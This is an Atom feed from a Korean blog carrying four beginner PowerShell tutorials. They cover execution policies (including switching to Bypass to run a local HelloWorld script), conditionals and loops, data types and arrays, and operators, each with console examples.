<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-08-08T18:13:47+09:00</updated><id>http://localhost:4000/</id><title type="html">k3y6reak</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</subtitle><entry><title type="html">Execution Policy</title><link href="http://localhost:4000/technique/powershell/2017/08/08/Execution_Policy.html" rel="alternate" type="text/html" title="Execution Policy" /><published>2017-08-08T17:59:00+09:00</published><updated>2017-08-08T17:59:00+09:00</updated><id>http://localhost:4000/technique/powershell/2017/08/08/Execution_Policy</id><content type="html" xml:base="http://localhost:4000/technique/powershell/2017/08/08/Execution_Policy.html">&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;PowerShell에서 Script를 바로 실행할 수 없습니다.&lt;/p&gt;

&lt;p&gt;notepad를 이용해서 “HelloWorld!”를 작성한 뒤 &lt;code class=&quot;highlighter-rouge&quot;&gt;HelloWorld.ps1&lt;/code&gt; 파일을 생성합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak\Desktop&amp;gt; .\HelloWorld.ps1
.\HelloWorld.ps1 : 이 시스템에서 스크립트를 실행할 수 없으므로 C:\Users\k3y6reak\Desktop\HelloWorld.ps1 파일을 로드할 수 없습니다. 자세한 내용은 http://go.microsoft.com/fwlink/?Li
nkID=135170의 about_Execution_Policies를 참조하십시오.
위치 줄:1 문자:1
+ .\HelloWorld.ps1
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : 보안 오류: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위 에러를 살펴보면 HelloWorld.ps1 파일을 로드할 수 없고 &lt;code class=&quot;highlighter-rouge&quot;&gt;about_Execution_Policies&lt;/code&gt;를 참조하라고 나옵니다.&lt;/p&gt;

&lt;p&gt;먼저 현재 권한이 어떻게 되는지 살펴보겠습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak\Desktop&amp;gt; Get-ExecutionPolicy
Restricted&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;현재 권한은 &lt;code class=&quot;highlighter-rouge&quot;&gt;Restricted&lt;/code&gt; 이며 &lt;code class=&quot;highlighter-rouge&quot;&gt;제한된&lt;/code&gt;이라는 뜻을 갖고 있습니다. 말 그대로 제한된 권한을 사용한다는 것입니다. 아무래도 아무 스크립트나 실행할 수 없도록 한 것 같습니다.&lt;/p&gt;

&lt;p&gt;여기서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Help&lt;/code&gt;를 이용해 about_Execution_Policies에 대해서 찾아보겠습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak\Desktop&amp;gt; Get-Help about_Execution_Policies
TOPIC
    about_Execution_Policies

SHORT DESCRIPTION
    Describes the Windows PowerShell execution policies and explains
    how to manage them.
    ...(중략)

WINDOWS POWERSHELL EXECUTION POLICIES
-------------------------------------

   The Windows PowerShell execution policies are as follows:

   &quot;Restricted&quot; is the default policy.

       Restricted
           - Default execution policy in Windows 8,
             Windows Server 2012, and Windows 8.1.

           - Permits individual commands, but will not run
             scripts.

           - Prevents running of all script files, including
             formatting and configuration files (.ps1xml), module
             script files (.psm1), and Windows PowerShell
             profiles (.ps1).

             ...(중략)

       Bypass
           - Nothing is blocked and there are no warnings or
             prompts.

           - This execution policy is designed for configurations
             in which a Windows PowerShell script is built in to a
             a larger application or for configurations in which
             Windows PowerShell is the foundation for a program
             that has its own security model.


       Undefined
           - There is no execution policy set in the current scope.

           - If the execution policy in all scopes is Undefined, the
             effective execution policy is Restricted, which is the
             default execution policy.


   Note: On systems that do not distinguish Universal Naming Convention (UNC)
         paths from Internet paths, scripts that are identified by a UNC path
         might not be permitted to run with the RemoteSigned execution policy.
         ...(생략)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위 도움말을 보면 &lt;code class=&quot;highlighter-rouge&quot;&gt;Restricted&lt;/code&gt; 권한은 Default로 되어있고 이를 해지하려면 &lt;code class=&quot;highlighter-rouge&quot;&gt;bypass&lt;/code&gt;권한을 이용해야 합니다.&lt;/p&gt;

&lt;p&gt;권한을 변경하기 위해서 &lt;code class=&quot;highlighter-rouge&quot;&gt;관리자 권한&lt;/code&gt;으로 PowerShell를 실행시킨 후 &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-ExecutionPolicy Bypass&lt;/code&gt;를 입력해 줍니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32&amp;gt; Set-ExecutionPolicy Bypass

실행 규칙 변경
실행 정책은 신뢰하지 않는 스크립트로부터 사용자를 보호합니다. 실행 정책을 변경하면 about_Execution_Policies 도움말
항목(http://go.microsoft.com/fwlink/?LinkID=135170)에 설명된 보안 위험에 노출될 수 있습니다. 실행 정책을
변경하시겠습니까?
[Y] 예(Y)  [A] 모두 예(A)  [N] 아니요(N)  [L] 모두 아니요(L)  [S] 일시 중단(S)  [?] 도움말 (기본값은 &quot;N&quot;): Y&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;그 후 다시 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-ExecutionPolicy&lt;/code&gt;를 실행하면 &lt;code class=&quot;highlighter-rouge&quot;&gt;Bypass&lt;/code&gt;로 권한이 변경된 것을 알 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak\Desktop&amp;gt; Get-ExecutionPolicy
Bypass&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;다시 HelloWorld.ps1를 실행하면 정상적으로 실행되는 것을 알 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak\Desktop&amp;gt; .\HelloWorld.ps1
Hello World&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name></name></author><summary type="html"></summary></entry><entry><title type="html">Condition_and_Loop</title><link href="http://localhost:4000/technique/powershell/2017/08/08/condition_and_loop.html" rel="alternate" type="text/html" title="Condition_and_Loop" /><published>2017-08-08T12:58:00+09:00</published><updated>2017-08-08T12:58:00+09:00</updated><id>http://localhost:4000/technique/powershell/2017/08/08/condition_and_loop</id><content type="html" xml:base="http://localhost:4000/technique/powershell/2017/08/08/condition_and_loop.html">&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이번에는 PowerShell에서 사용하는 조건문과 반복문에 대해서 알아보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;조건문&quot;&gt;조건문&lt;/h3&gt;

&lt;p&gt;다른 언어와 마찬가지로 PowerShell에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;if~else&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;if~elseif~else&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;switch&lt;/code&gt;를 사용합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; if (1 -gt 0) {&quot;1 &amp;gt; 0&quot;}
1 &amp;gt; 0
PS C:\Users\k3y6reak&amp;gt; if (1 -gt 5) { &quot;1 &amp;gt; 0&quot; } else{ &quot;1 &amp;lt; 5&quot; }
1 &amp;lt; 5
PS C:\Users\k3y6reak&amp;gt; $num = 2
PS C:\Users\k3y6reak&amp;gt; if ($num -eq 1) { &quot;num is 1&quot; } elseif( $num -eq 2 ) { &quot;num is 2&quot; } else { &quot;i don't know&quot; }
num is 2
PS C:\Users\k3y6reak&amp;gt; $num = 3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위와 같이 다른 언어에서 사용하는 것과 동일하게 PowerShell에서 사용할 수 있습니다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;switch&lt;/code&gt; 구문도 동일하게 사용하지만 좀 더 추가된 것이 있습니다. &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;를 이용하는 방법인데, 아래 예제를 보겠습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; switch ($num) {1{&quot;num is 1&quot;} 2{&quot;num is two&quot;} default{&quot;i don't know&quot;}}
i don't know
PS C:\Users\k3y6reak&amp;gt; $str = &quot;abcd&quot;
PS C:\Users\k3y6reak&amp;gt; switch -wildcard ($str) { a*{&quot;a~&quot;} *b*{&quot;~b~&quot;} c*{&quot;c~&quot;}}
a~
~b~&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;를 사용해서 switch 구문을 이용할 수 있습니다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;반복문&quot;&gt;반복문&lt;/h3&gt;

&lt;p&gt;마찬가지로 &lt;code class=&quot;highlighter-rouge&quot;&gt;while&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;do~while&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt;를 사용할 수 있으며 추가적으로 &lt;code class=&quot;highlighter-rouge&quot;&gt;do~until&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;foreach&lt;/code&gt;를 사용할 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $count = 3
PS C:\Users\k3y6reak&amp;gt; while ( $count -gt 0)
&amp;gt;&amp;gt; {
&amp;gt;&amp;gt; &quot;count is $count&quot;
&amp;gt;&amp;gt; $count--
&amp;gt;&amp;gt; }
count is 3
count is 2
count is 1
PS C:\Users\k3y6reak&amp;gt; $count = 3
PS C:\Users\k3y6reak&amp;gt; do
&amp;gt;&amp;gt; {
&amp;gt;&amp;gt; &quot;count is $count&quot;
&amp;gt;&amp;gt; $count--
&amp;gt;&amp;gt; }
&amp;gt;&amp;gt; while( $count -gt 0)
count is 3
count is 2
count is 1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;while&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;do~while&lt;/code&gt;은 동일하게 실행됩니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $count = 3
PS C:\Users\k3y6reak&amp;gt; do
&amp;gt;&amp;gt; {
&amp;gt;&amp;gt; &quot;count is $count&quot;
&amp;gt;&amp;gt; $count--
&amp;gt;&amp;gt; }
&amp;gt;&amp;gt; until( $count -gt 0)
count is 3
PS C:\Users\k3y6reak&amp;gt; do
&amp;gt;&amp;gt; {
&amp;gt;&amp;gt; &quot;count is $count&quot;
&amp;gt;&amp;gt; $count--
&amp;gt;&amp;gt; }
&amp;gt;&amp;gt; until( $count -lt 0)
count is 2
count is 1
count is 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;until&lt;/code&gt;은 &lt;code class=&quot;highlighter-rouge&quot;&gt;~때 까지&lt;/code&gt;로 처음 실행한 &lt;code class=&quot;highlighter-rouge&quot;&gt;$count -gt 0&lt;/code&gt;의 의미는 &lt;code class=&quot;highlighter-rouge&quot;&gt;0보다 클 때까지만&lt;/code&gt;실행하기 때문에 count는 3이됩니다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;while&lt;/code&gt;과 &lt;code class=&quot;highlighter-rouge&quot;&gt;until&lt;/code&gt;은 서로 반대되는 개념이라고 생각하면 됩니다.&lt;/p&gt;

&lt;p&gt;for문 또한 동일하게 사용할 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; for ($i = 0; $i -lt 10; $i++)
&amp;gt;&amp;gt; {
&amp;gt;&amp;gt; &quot;i is $i&quot;
&amp;gt;&amp;gt; }
i is 0
i is 1
i is 2
i is 3
i is 4
i is 5
i is 6
i is 7
i is 8
i is 9&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;foreach&lt;/code&gt; 구문은 python 에서 for문과 동일합니다. java에도 foreach구문이 있죠.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $arr = &quot;Hello World!&quot;
PS C:\Users\k3y6reak&amp;gt; foreach ($str in $arr)
&amp;gt;&amp;gt; {
&amp;gt;&amp;gt; $str
&amp;gt;&amp;gt; }
Hello World!
PS C:\Users\k3y6reak&amp;gt; $arr = 1,2,3,4,5
PS C:\Users\k3y6reak&amp;gt; foreach($num in $arr)
&amp;gt;&amp;gt; {
&amp;gt;&amp;gt; $num
&amp;gt;&amp;gt; }
1
2
3
4
5&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위 예제를 보면 문자열인 경우 각 인덱스별로 값을 출력하는 것이 아니라 한 번에 출력하는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;이 외에도 ForEach-Object와 Where-Object가 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-Process | ForEach-Object {$_.Name}
acrotray
ApplicationFrameHost
armsvc
coherence
coherence
coherence
conhost
csrss
csrss
dasHost
dllhost
dwm
explorer
fontdrvhost
fontdrvhost
Idle
IpOverUsbSvc
lsass
Memory Compression
MSASCuiL
msdtc
MsMpEng
NisSrv
OneDrive
powershell&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Get-Process를 이용해 얻은 값을 ForEach-Object를 통해서 &lt;code class=&quot;highlighter-rouge&quot;&gt;_.&lt;/code&gt;에 넣어준 후 &lt;code class=&quot;highlighter-rouge&quot;&gt;Name&lt;/code&gt;만 출력해주는 방법입니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-ChildItem C:\Users\k3y6reak\Desktop | Where-Object {$_.Name -match &quot;exe&quot;}


    디렉터리: C:\Users\k3y6reak\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----    2017. 8. 2.  오전 12:35        1368442 asby.exe&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Where-Object를 이용해 &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; 처럼 사용할 수 있습니다.&lt;/p&gt;</content><author><name></name></author><summary type="html"></summary></entry><entry><title type="html">Type and Array</title><link href="http://localhost:4000/technique/powershell/2017/08/07/Type_and_Array.html" rel="alternate" type="text/html" title="Type and Array" /><published>2017-08-07T19:45:00+09:00</published><updated>2017-08-07T19:45:00+09:00</updated><id>http://localhost:4000/technique/powershell/2017/08/07/Type_and_Array</id><content type="html" xml:base="http://localhost:4000/technique/powershell/2017/08/07/Type_and_Array.html">&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;PowerShell에서 각 변수에 대한 자료형을 알아보는 방법과 배열에 대해서 알아보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;type&quot;&gt;Type&lt;/h3&gt;

&lt;p&gt;PowerShell에서는 각 변수에 &lt;code class=&quot;highlighter-rouge&quot;&gt;.GetType()&lt;/code&gt;를 붙여주면 자료형을 알 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; &quot;3&quot;.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     String                                   System.Object


PS C:\Users\k3y6reak&amp;gt; $a = 3
PS C:\Users\k3y6reak&amp;gt; $a.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Int32                                    System.ValueType


PS C:\Users\k3y6reak&amp;gt; $b = 3.2
PS C:\Users\k3y6reak&amp;gt; $b.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Double                                   System.ValueType&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;다른 언어들과 동일하게 자료형이 정해지는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;문자열을 사용하는 경우 &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt;과 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;에 대한 차이를 알아야 합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $a = &quot;Hello My name is k3y6reak&quot;
PS C:\Users\k3y6reak&amp;gt; $b = 'Hello My name is k3y6reak'
PS C:\Users\k3y6reak&amp;gt; $a.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     String                                   System.Object


PS C:\Users\k3y6reak&amp;gt; $b.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     String                                   System.Object


PS C:\Users\k3y6reak&amp;gt; &quot;val a is $a&quot;
val a is Hello My name is k3y6reak
PS C:\Users\k3y6reak&amp;gt; 'val b is $b'
val b is $b
PS C:\Users\k3y6reak&amp;gt; &quot;val b is $b&quot;
val b is Hello My name is k3y6reak&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt;과 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;는 모두 동일하게 String 자료형을 갖고 있으나 변수의 내용을 출력할 때는 위와 같이 차이를 보입니다.&lt;/p&gt;

&lt;p&gt;여러 줄을 이용하여 문자열을 작성하고 싶다면 &lt;code class=&quot;highlighter-rouge&quot;&gt;@&quot;&lt;/code&gt;으로 시작해 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;@&lt;/code&gt;로 끝나면 됩니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $str = @&quot;
&amp;gt;&amp;gt; &quot;Hi&quot;
&amp;gt;&amp;gt; &quot;My name is&quot;
&amp;gt;&amp;gt; &quot;k3y6reak&quot;
&amp;gt;&amp;gt; &quot;@
PS C:\Users\k3y6reak&amp;gt; $str
&quot;Hi&quot;
&quot;My name is&quot;
&quot;k3y6reak&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;배열&quot;&gt;배열&lt;/h3&gt;

&lt;p&gt;배열은 다른언어와 동일하게 사용할 수 있습니다. 대부분의 스크립트 언어는 하나의 배열에 여러가지의 형태가 들어가도 상관없는 것 처럼 PowerShell 또한 여러가지 형태가 들어갈 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $arr = 1,2,3
PS C:\Users\k3y6reak&amp;gt; $arr
1
2
3
PS C:\Users\k3y6reak&amp;gt; $arr.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Object[]                                 System.Array&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;여기서 배열에 대한 자료형은 Object[]로 나타낸 다는 것에 주의하면 됩니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $arr2 = 1, 2.3, &quot;Hello&quot;
PS C:\Users\k3y6reak&amp;gt; $arr2
1
2.3
Hello&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위 예제처럼 여러가지 자료형을 갖는 배열을 만들 수 있습니다.&lt;/p&gt;

&lt;p&gt;아무것도 없는 배열을 만들고 싶다면 &lt;code class=&quot;highlighter-rouge&quot;&gt;$arr = @()&lt;/code&gt;로 만들 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $arr3 = @()
PS C:\Users\k3y6reak&amp;gt; $arr3
PS C:\Users\k3y6reak&amp;gt; $arr3.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Object[]                                 System.Array&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;마찬가지로 &lt;code class=&quot;highlighter-rouge&quot;&gt;[]&lt;/code&gt;를 이용하여 각 인덱스의 값을 출력할 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $arr = &quot;Hello My name is k3y6reak&quot;
PS C:\Users\k3y6reak&amp;gt; $arr[0]
H
PS C:\Users\k3y6reak&amp;gt; $arr[1]
e&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;또한 &lt;code class=&quot;highlighter-rouge&quot;&gt;[]&lt;/code&gt;를 이용하여 값의 자료형을 변환할 수 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $i = 3.2
PS C:\Users\k3y6reak&amp;gt; $i.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Double                                   System.ValueType


PS C:\Users\k3y6reak&amp;gt; [int]$i
3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name></name></author><summary type="html"></summary></entry><entry><title type="html">Operators</title><link href="http://localhost:4000/technique/powershell/2017/08/07/Operators.html" rel="alternate" type="text/html" title="Operators" /><published>2017-08-07T15:20:00+09:00</published><updated>2017-08-07T15:20:00+09:00</updated><id>http://localhost:4000/technique/powershell/2017/08/07/Operators</id><content type="html" xml:base="http://localhost:4000/technique/powershell/2017/08/07/Operators.html">&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이번에는 PowerShell에서 사용하는 연산자에 대해서 알아보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;PowerShell에서도 마찬가지로 다른 언어와 동일하게 연산자가 사용됩니다. 산술, 대입, 비교, 리다이렉션, 논리, 타입 등이 존재합니다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;산술-연산자&quot;&gt;산술 연산자&lt;/h3&gt;

&lt;p&gt;산술 연산자는 &lt;code class=&quot;highlighter-rouge&quot;&gt;덧셈, 뺄셈, 나눗셈, 곱셈&lt;/code&gt;을 하는 것을 뜻합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; 3 + 1
4
PS C:\Users\k3y6reak&amp;gt; 3 - 1
2
PS C:\Users\k3y6reak&amp;gt; 3 * 2
6
PS C:\Users\k3y6reak&amp;gt; 3 / 2
1.5
PS C:\Users\k3y6reak&amp;gt; 3 % 2
1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;다른 언어의 경우 나눗셈을 할 때 &lt;code class=&quot;highlighter-rouge&quot;&gt;정수값&lt;/code&gt;을 출력해주지만 PowerSell에서는 &lt;code class=&quot;highlighter-rouge&quot;&gt;소수&lt;/code&gt;로 출력하는 것이 다릅니다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;대입-연산자&quot;&gt;대입 연산자&lt;/h3&gt;

&lt;p&gt;대입 연산자는 &lt;code class=&quot;highlighter-rouge&quot;&gt;변수에 값을 넣는 것&lt;/code&gt;을 뜻합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; $a = 3
PS C:\Users\k3y6reak&amp;gt; $a
3
PS C:\Users\k3y6reak&amp;gt; $a *= 2
PS C:\Users\k3y6reak&amp;gt; $a
6
PS C:\Users\k3y6reak&amp;gt; $a -= 1
PS C:\Users\k3y6reak&amp;gt; $a
5
PS C:\Users\k3y6reak&amp;gt; $a += 3
PS C:\Users\k3y6reak&amp;gt; $a
8
PS C:\Users\k3y6reak&amp;gt; $a /= 3
PS C:\Users\k3y6reak&amp;gt; $a
2.66666666666667
PS C:\Users\k3y6reak&amp;gt; $a %= 2
PS C:\Users\k3y6reak&amp;gt; $a
0.666666666666667&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;비교-연산자&quot;&gt;비교 연산자&lt;/h3&gt;

&lt;p&gt;비교 연산자는 &lt;code class=&quot;highlighter-rouge&quot;&gt;값을 비교하는 것&lt;/code&gt;을 뜻합니다. 다른 언어와는 다르게 ==, !=, &amp;lt; 등 을 사용하지 못합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; 2 &amp;lt; 3
위치 줄:1 문자:3
+ 2 &amp;lt; 3
+   ~
'&amp;lt;' 연산자는 나중에 사용하도록 예약되어 있습니다.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : RedirectionNotSupported

PS C:\Users\k3y6reak&amp;gt; 2 == 3
위치 줄:1 문자:1
+ 2 == 3
+ ~
대입 식이 잘못되었습니다. 대입 연산자의 입력은 변수 또는 속성과 같이 대입을 허용할 수 있는 개체여야 합니다.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : InvalidLeftHandSide&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위와 같이 에러를 발생하기 때문에 다른 연산자를 사용해야 합니다.
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;-eq, -ne, -gt, -lt, -le, -ge, -match, -notmatch, -replace, -like, -notlike, -in, -notin, -contains, -notcontains&lt;/code&gt;가 있습니다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-eq&lt;/code&gt;는 equal 로 값이 같은지를 확인합니다. 숫자와 문자 모두 비교가 가능합니다.
문자를 비교할 때는 대소문자를 따지지 않습니다.&lt;/p&gt;

